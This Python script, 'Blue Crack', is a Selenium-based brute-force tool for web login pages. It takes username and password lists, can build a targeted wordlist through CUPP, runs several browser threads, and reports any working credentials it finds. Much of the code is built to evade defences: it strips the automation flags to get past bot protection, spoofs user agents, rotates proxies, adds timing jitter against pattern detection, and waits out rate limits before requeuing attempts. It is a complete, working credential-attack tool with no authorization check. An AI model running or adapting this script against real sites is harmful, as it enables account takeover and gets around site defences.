print("""
\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
\033[34m██╔══██╗██║     ╚██╗ ██╔╝██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
\033[34m██████╔╝███████╗ ╚████╔╝ ███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
\033[34m╚═════╝ ╚══════╝  ╚═══╝  ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
""")
import argparse
import threading
import time
import random
import os
import sys
from queue import Queue

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import keyboard

# CLI ARGUMENTS (HYDRA STYLE)
parser = argparse.ArgumentParser(description="Hydra-style Browser Tester")

# USERNAME INPUT
parser.add_argument("-u", "--user", dest="username",
                    help="single username to test")
parser.add_argument("-U", "--userfile", dest="userfile",
                    help="file containing list of usernames")

# PASSWORD INPUT
parser.add_argument("-p", "--passw", dest="password",
                    help="single password to test")
parser.add_argument("-P", "--passlist", dest="passfile",
                    help="file containing list of passwords")

# OTHER
parser.add_argument("--threads", type=int, default=1,
                    help="number of threads")
parser.add_argument("--url",
                    help="login page URL")
parser.add_argument("--error", default="incorrect",
                    help="error message to check for failed login (default: 'incorrect')")
parser.add_argument("--headless", action="store_true",
                    help="run worker browsers in headless mode")
parser.add_argument("--delay", type=float, default=0.0,
                    help="delay between natural attempts to stay stealthy")
parser.add_argument("--limit-text", default="too many requests",
                    help="text confirming rate limit hit")
parser.add_argument("--cooldown", type=int, default=12,
                    help="cooldown bypass timer to wait out rate blocks")
parser.add_argument("--jitter", type=float, default=0.0,
                    help="randomize the delay by up to X seconds to avoid pattern detection")
parser.add_argument("--proxy", 
                    help="single proxy to use (e.g., http://12.34.56.78:8080)")
parser.add_argument("--proxy-list", dest="proxyfile",
                    help="file containing list of proxies to rotate")
parser.add_argument("-i", "--interactive", action="store_true",
                    help="launch fully interactive/auto setup wizard")

args = parser.parse_args()

# INTERACTIVE MODE
if args.interactive:
    print("\n\033[36m--- WIZARD MODE ---\033[0m")
    
    # CUPP Integration
    run_cupp = input("\nGenerate a targeted wordlist first using CUPP? (y/n) [default: n]: ").strip().lower() == 'y'
    if run_cupp:
        print("\n\033[33m--- LAUNCHING CUPP (Common User Passwords Profiler) ---\033[0m")
        if os.path.exists("cupp.py"):
            os.system(f"{sys.executable} cupp.py -i")
            print("\n\033[32m[+] CUPP completed! Make sure to remember the saved filename.\033[0m\n")
        else:
            print("\n❌ cupp.py not found in the directory. Skipping...\n")
            
    args.url = input("\nEnter Target URL: ").strip()
    args.username = input("Enter single username to test (leave blank to skip): ").strip() or None
    if not args.username:
        args.userfile = input("Enter path to usernames list file: ").strip() or None
    
    # Get password approach correctly in wizard
    single_pass = input("Enter single password to test (leave blank to skip): ").strip()
    if single_pass:
        args.password = single_pass
        args.passfile = None
    else:
        args.password = None
        args.passfile = input("Enter path to passwords list file: ").strip() or None
    
    threads_in = input("Enter number of threads [default: 1]: ").strip()
    args.threads = int(threads_in) if threads_in.isdigit() else 1
    
    err_in = input("Enter error string to check (default: 'incorrect'): ").strip()
    if err_in:
        args.error = err_in
        
    delay_in = input("Enter general delay between attempts in seconds [default: 0]: ").strip()
    args.delay = float(delay_in) if delay_in.replace('.', '', 1).isdigit() else 0.0
    
    jitter_in = input("Enter jitter/randomizer up to X seconds [default: 0.0]: ").strip()
    args.jitter = float(jitter_in) if jitter_in.replace('.', '', 1).isdigit() else 0.0
    
    use_proxy = input("Use proxy? (y/n) [default: n]: ").strip().lower() == 'y'
    if use_proxy:
        p_file = input("Enter path to proxy list file (or hit enter to use single proxy): ").strip()
        if p_file:
            args.proxyfile = p_file
        else:
            args.proxy = input("Enter proxy IP:PORT (e.g., http://1.2.3.4:8080): ").strip()
    
    rl_bypass = input("Enable Auto-Throttle for Rate Limits? (y/n) [default: y]: ").strip().lower() != 'n'
    args.cooldown = 12 if rl_bypass else 0
    if rl_bypass:
        rl_text = input("Enter Rate Limit text to detect [default: 'too many requests']: ").strip()
        if rl_text:
            args.limit_text = rl_text
        
    auto_detect = input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ").strip().lower() != 'n'
else:
    auto_detect = False
    if not args.url:
        raise SystemExit("❌ Provide --url or use -i wizard")

if not args.username and not args.userfile:
    raise SystemExit("❌ Provide -u USER or -U USERFILE")

if not args.password and not args.passfile:
    raise SystemExit("❌ Provide -p PASS or -P PASSLIST")
    
# LOAD USERNAMES
users = []

if args.username:
    users.append(args.username)

if args.userfile:
    with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            users.append(line.strip())
# LOAD PASSWORDS
passwords = []

if args.password:
    passwords.append(args.password)

if args.passfile:
    with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            px = line.strip()
            if px:  # Avoid empty strings creating false-positive vulnerabilities
                passwords.append(px)

# LOAD PROXIES
proxies = []
if args.proxy:
    proxies.append(args.proxy)
if args.proxyfile:
    with open(args.proxyfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if line.strip():
                proxies.append(line.strip())

USERNAME_FIXED = users[0] if len(users) == 1 else None
USERLIST = users if len(users) > 1 else None

PASSWORD_FIXED = passwords[0] if len(passwords) == 1 else None
PASSLIST = passwords if len(passwords) > 1 else None
WORDLIST = f"{len(passwords)} passwords loaded for {len(users)} users"
PROXY_INFO = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"

THREADS = args.threads
TARGET_URL = args.url
if TARGET_URL and not TARGET_URL.startswith("http://") and not TARGET_URL.startswith("https://"):
    TARGET_URL = "http://" + TARGET_URL
ERROR_MSG = args.error.lower()
LIMIT_TEXT = args.limit_text.lower() if args.limit_text else None
COOLDOWN = args.cooldown
DELAY = args.delay
JITTER = args.jitter
RUN_HEADLESS = args.headless


# LAUNCH SELENIUM
driver = webdriver.Chrome()
driver.get(TARGET_URL)

username_selector = None
password_selector = None
submit_selector = None

print("\n==============================")
print("🔥 BROWSER BRUTE TESTER 🔥")
print("==============================\n")
print(f"Target URL: {TARGET_URL}")
print(f"User: {USERNAME_FIXED}")
print(f"Wordlist: {WORDLIST}")
print(f"Proxies: {PROXY_INFO}")
print(f"Threads: {THREADS}")
print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
# Inject JS to track last clicked element
driver.execute_script("""
document.addEventListener('click', function(e) {
    window._lastClicked = e.target;
});
""")

# GENERATE CSS SELECTOR FROM CLICKED ELEMENT
def get_css_selector():
    elem = driver.execute_script("return window._lastClicked")
    if elem is None:
        return None
    return driver.execute_script("""
    function cssPath(el){
        if (!el) return null;
        var path = [];
        while (el.nodeType === Node.ELEMENT_NODE){
            var selector = el.nodeName.toLowerCase();
            if (el.id){
                selector += "#" + el.id;
                path.unshift(selector);
                break;
            } else {
                var sib = el, nth = 1;
                while(sib = sib.previousElementSibling){
                    if (sib.nodeName.toLowerCase() == selector)
                        nth++;
                }
                if (nth != 1)
                    selector += ":nth-of-type("+nth+")";
            }
            path.unshift(selector);
            el = el.parentNode;
        }
        return path.join(" > ");
    }
    return cssPath(arguments[0]);
    """, elem)

if auto_detect:
    print("\n🔍 Auto-detecting login form fields...")
    time.sleep(2)  # Let page load completely
    try:
        # Passwords usually have type "password"
        # Usernames are usually the element right before the password or type="text"/"email"
        driver.execute_script("""
            window._autoFindFields = function() {
                let passwordField = document.querySelector('input[type="password"]');
                let userField = null;
                
                if (passwordField) {
                    // Look for preceding text/email inputs in the same form
                    let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
                    for (let el of inputs) {
                        if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
                            userField = el;
                            break;
                        }
                    }
                }
                
                // Fallback basic CSS
                let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
                let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
                
                return [ucss, pcss];
            };
        """)
        
        detected_selectors = driver.execute_script("return window._autoFindFields();")
        if detected_selectors and detected_selectors[0] and detected_selectors[1]:
            username_selector, password_selector = detected_selectors
            print(f"✅ AUTO-DETECTED Username: {username_selector}")
            print(f"✅ AUTO-DETECTED Password: {password_selector}")
        else:
            print("❌ Courier auto-detect failed. Please lock manually.")
            auto_detect = False
    except Exception as e:
        print(f"❌ Auto-detect script failed: {e}. Switching to manual mode.")
        auto_detect = False

# WAIT FOR USER TO LOCK FIELDS
if not auto_detect:
    print("\n👉 CLICK username field → press S")
    print("👉 CLICK password field → press T")
    print("👉 Press ENTER to start brute\n")

while username_selector is None or password_selector is None:
    if keyboard.is_pressed("s"):
        css = get_css_selector()
        if css:
            username_selector = css
            print(f"🔵 Username selector LOCKED: {css}")
        time.sleep(0.3)
    if keyboard.is_pressed("t"):
        css = get_css_selector()
        if css:
            password_selector = css
            print(f"🟣 Password selector LOCKED: {css}")
        time.sleep(0.3)

print("\nSelectors locked! Press ENTER to launch brute...")

# TEST THE SELECTORS IMMEDIATELY (fix)
driver.find_element(By.CSS_SELECTOR, username_selector)
driver.find_element(By.CSS_SELECTOR, password_selector)

keyboard.wait("enter")

# LOAD WORDLIST
q = Queue()
for user in users:
    for pwd in passwords:
        q.put((user, pwd))

found = False

# WORKER FUNCTION
def worker():
    global found
    
    # Initialize a new webdriver for each thread
    options = webdriver.ChromeOptions()
    
    # STEALTH: Remove webdriver flag to bypass basic bot protection
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument('--disable-blink-features=AutomationControlled')
    
    # Spoof User Agent randomly
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
    
    # Optional Proxy Rotation
    if proxies:
        proxy = random.choice(proxies)
        options.add_argument(f"--proxy-server={proxy}")

    if RUN_HEADLESS:
        options.add_argument("--headless")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920x1080")
        
    thread_driver = webdriver.Chrome(options=options)
    
    try:
        while not q.empty() and not found:
            user, pwd = q.get()
            
            # Skip empty passwords (especially artifacts from CUPP generation)
            if not pwd or str(pwd).strip() == "":
                q.task_done()
                continue
                
            try:
                # Break early if another thread already found the password
                if found:
                    break
                    
                # Add delay if configured
                actual_delay = DELAY
                if JITTER > 0.0:
                    actual_delay += random.uniform(0, JITTER)
                    
                if actual_delay > 0.0:
                    for _ in range(int(actual_delay * 10)): # sleep in small chunks so we can break early
                        if found: break
                        time.sleep(0.1)
                
                if found:
                    break
                
                thread_driver.get(TARGET_URL)
                if found:
                    break
                    
                try:
                    
                    u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                    p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
                    u.clear()
                    u.send_keys(user)
                    p.clear()
                    p.send_keys(pwd)
                    p.send_keys(Keys.ENTER)
                    
                    if found:
                        break
                        
                    print(f"[*] Trying: {user} / {pwd}")
                    
                    # Wait for login to process, check periodically
                    for _ in range(20):
                        if found: break
                        time.sleep(0.1)
                        
                    if found:
                        break
                    
                    # Check error message
                    page_source = thread_driver.page_source.lower()
                    current_url = thread_driver.current_url
                    
                    # Check for rate limiting first
                    if LIMIT_TEXT and LIMIT_TEXT in page_source:
                        print(f"[\033[33m!\033[0m] Rate Limit detected ('{LIMIT_TEXT}')!")
                        if COOLDOWN > 0:
                            print(f"[\033[36m~\033[0m] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}")
                            # sleep in small steps to break early if another thread solves it
                            for _ in range(COOLDOWN * 10):
                                if found: break
                                time.sleep(0.1)
                            if not found:
                                q.put((user, pwd))  # Put the exact combo back in the queue to try again
                        else:
                            print(f"[-] Rate limit hit, skipping {user}/{pwd}...")
                        continue

                    # First check if the page actually contains our explicit fail phrase
                    if ERROR_MSG and ERROR_MSG in page_source:
                        # It explicitly failed
                        continue
                        
                    # If we got here, the explicit fail message is missing.
                    # It might be a win. Alternatively, check if URL changed to something unexpected.
                    if not found:
                        print(f"\n[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥\n")
                        found = True
                        
                        # Clear the queue so other threads stop grabbing new combos
                        with q.mutex:
                            q.queue.clear()
                            
                    break
                except (NoSuchElementException, WebDriverException) as e:
                    print(f"[-] Error during attempt with '{user} / {pwd}': element not found or page not loaded properly.")
            except Exception as e:
                print(f"[-] Navigation or unexpected error: {e}")
            finally:
                q.task_done()
    finally:
        try:
            thread_driver.quit()
        except:
            pass

# Close the initial setup driver
try:
    driver.quit()
except:
    pass

# THREAD LAUNCHER
threads = []
print(f"\n[*] Starting {THREADS} threads...\n")
try:
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Wait for completion
    q.join()
        
    if not found:
        print("\n[-] Finished testing. No valid credentials found.")
    else:
        print("\n[+] Finished testing. Valid credentials found!")
except KeyboardInterrupt:
    print("\n[!] Interrupted by user. Exiting...")
    found = True
finally:
    pass
